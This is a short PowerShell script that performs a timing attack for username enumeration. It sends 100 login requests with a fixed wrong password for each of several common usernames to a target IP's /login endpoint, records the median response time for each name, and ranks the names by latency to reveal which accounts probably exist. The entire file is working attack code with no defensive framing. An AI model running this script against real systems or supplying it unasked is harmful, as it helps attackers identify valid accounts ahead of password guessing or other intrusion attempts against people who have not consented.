param (
    [Parameter(Mandatory=$true)]
    [string]$Ip,              
    [string]$Username            
)



$usernames = @("admin", "user3", "john", "jane", "user1", "guest", "root","user2")
$usernames += $username

# Target URL
$url = "http://$($Ip)/login"

# Static password used in the body
$password = "abcdefghijklmnopqrstuvwxyz"

$headers = @{
    "Content-Type"  = "application/json"
    "Accept"        = "application/json, text/plain, */*"
}

function Get-Median {
    param([double[]]$Values)
    $sorted = $Values | Sort-Object
    $count = $sorted.Count
    if ($count % 2 -eq 0) {
        return ($sorted[$count / 2 - 1] + $sorted[$count / 2]) / 2
    } else {
        return $sorted[($count - 1) / 2]
    }
}

$results = @()

foreach ($username in $usernames) {
    $durations = @()

    for ($i = 0; $i -lt 100; $i++) {
        $body = @{ username = $username; password = $password } | ConvertTo-Json -Compress
        $start = Get-Date
        try {
            Invoke-WebRequest -Uri $url -Method POST -Body $body -Headers $headers -UseBasicParsing -TimeoutSec 10 | Out-Null
        } catch {
            # ignore exceptions and still measure time
        }
        $end = Get-Date
        $durations += ($end - $start).TotalMilliseconds
    }

    $median = Get-Median -Values $durations

    $results += [PSCustomObject]@{
        Username     = $username
        MedianTimeMS = [Math]::Round($median, 2)
    }
}

$results | Sort-Object MedianTimeMS -Descending | Format-Table -AutoSize
